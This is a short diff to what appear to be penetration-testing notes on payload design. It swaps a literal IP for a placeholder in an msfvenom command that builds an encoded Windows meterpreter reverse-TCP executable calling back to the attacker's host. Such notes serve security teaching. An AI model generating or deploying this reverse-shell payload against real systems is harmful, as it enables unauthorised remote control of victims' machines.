@@ -793,7 +793,7 @@ Things to take into account when desiging a payload
 5. Path where the file will be placed after creation could be in the `temp` folder, or `www` folder - is specified using the `-o` flag
 6. The listening host and the port, which is usually defined for the hacker's machine
 
-  - `msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe -o /tmp/hack.exe LHOST=192.168.0.8 LPORT=4444`
+  - `msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe -o /tmp/hack.exe LHOST=<hacker's ip address> LPORT=4444`
 
       - `msfvenom`: Launches the `msfvenom` program.
 
